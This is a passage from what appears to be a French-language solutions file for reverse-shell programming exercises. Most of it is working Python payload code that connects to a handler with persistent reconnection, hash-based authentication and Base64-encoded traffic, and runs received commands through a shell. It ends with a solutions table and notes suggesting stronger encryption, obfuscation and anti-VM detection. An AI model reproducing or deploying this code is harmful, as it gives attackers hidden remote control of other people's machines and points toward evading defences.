                    delai = min(delai_base * (2 ** (tentative - 1)), 60)
                    print(f"[PERSISTANCE] Prochaine tentative dans {delai}s...")
                    time.sleep(delai)

        def _authentifier(self) -> bool:
            """Authentifie"""
            try:
                server_hash = self.socket.recv(64).decode('utf-8').strip()

                if server_hash == ReverseShellComplete.PASSWORD_HASH:
                    self.socket.send(b"OK")
                    return True
                else:
                    self.socket.send(b"NOK")
                    return False

            except:
                return False

        def _encoder_message(self, message: str) -> bytes:
            return base64.b64encode(message.encode('utf-8'))

        def _decoder_message(self, donnees: bytes) -> str:
            try:
                return base64.b64decode(donnees).decode('utf-8')
            except:
                return ""

        def _executer_commande(self, commande: str) -> str:
            """Exécute commande avec support cd"""
            if commande.startswith("cd "):
                nouveau_dir = commande[3:].strip()
                try:
                    if nouveau_dir == "~":
                        nouveau_dir = os.path.expanduser("~")
                    elif nouveau_dir.startswith("~/"):
                        nouveau_dir = os.path.expanduser(nouveau_dir)

                    os.chdir(nouveau_dir)
                    self.current_dir = os.getcwd()
                    return f"Répertoire: {self.current_dir}\n"
                except Exception as e:
                    return f"Erreur: {e}\n"

            try:
                process = subprocess.Popen(
                    commande,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    cwd=self.current_dir
                )

                try:
                    stdout, _ = process.communicate(timeout=30)
                    return stdout
                except subprocess.TimeoutExpired:
                    process.kill()
                    return "[TIMEOUT]\n"

            except Exception as e:
                return f"[ERREUR] {str(e)}\n"

        def boucle_reception(self):
            """Boucle de réception avec reconnexion"""
            while True:
                if not self.socket:
                    if not self.connecter_avec_persistance():
                        continue

                try:
                    donnees_encodees = self.socket.recv(1024)

                    if not donnees_encodees:
                        self.socket = None
                        continue

                    commande = self._decoder_message(donnees_encodees)

                    if commande:
                        resultats = self._executer_commande(commande)
                    else:
                        resultats = ""

                    resultats_encodes = self._encoder_message(resultats)
                    self.socket.send(resultats_encodes)

                except Exception:
                    self.socket = None
                    time.sleep(1)

```
# =============================================================================
# UTILISATION
# =============================================================================

```python
if __name__ == "__main__":
    import threading

    print("Reverse Shell Complète - Mode Demo Local")
    print("=" * 70)

    # Créer instances
    handler = ReverseShellComplete.Handler(5000)
    payload = ReverseShellComplete.Payload("localhost", 5000)

    # Démarrer handler
    handler_thread = threading.Thread(target=handler.demarrer)
    handler_thread.daemon = True
    handler_thread.start()

    time.sleep(1)

    # Démarrer payload
    payload_thread = threading.Thread(target=payload.boucle_reception)
    payload_thread.daemon = True
    payload_thread.start()

    # Attendre
    handler_thread.join()
```
```

================================================================================
RÉSUMÉ DES SOLUTIONS
================================================================================

| Défi | Features | Fichier |
|------|----------|---------|
| 1 | Socket basique, exécution commandes | solution_1.py |
| 2 | Gestion erreurs, timeouts | solution_2.py |
| 3 | Authentification SHA256 | solution_3.py |
| 4 | Reconnexion persistante | solution_4.py |
| 5 | Encodage Base64 | solution_5.py |
| 6 | Commandes avancées, cd | solution_6.py |
| 7-8 | Complète avec toutes features | solution_complete.py |

================================================================================
NOTES D'IMPLÉMENTATION
================================================================================

1. SÉCURITÉ:
   - Toujours utiliser shell=True avec caution
   - Valider inputs si possible
   - Utiliser timeouts pour prévenir DoS

2. PERFORMANCE:
   - Chunks recv() plutôt que tout d'un coup
   - Gérer gros fichiers avec streaming
   - Limit concurrence (1 client à la fois dans les solutions)

3. COMPATIBILITÉ:
   - Tester sur Windows et Linux
   - Adapter chemins et commandes (cd vs dir)
   - UTF-8 encoding par défaut

4. AMÉLIORATIONS FUTURES:
   - Multi-clients (avec threading)
   - Vraie encryption (AES)
   - Compression (zlib)
   - Obfuscation avancée
   - Anti-détection VM

================================================================================
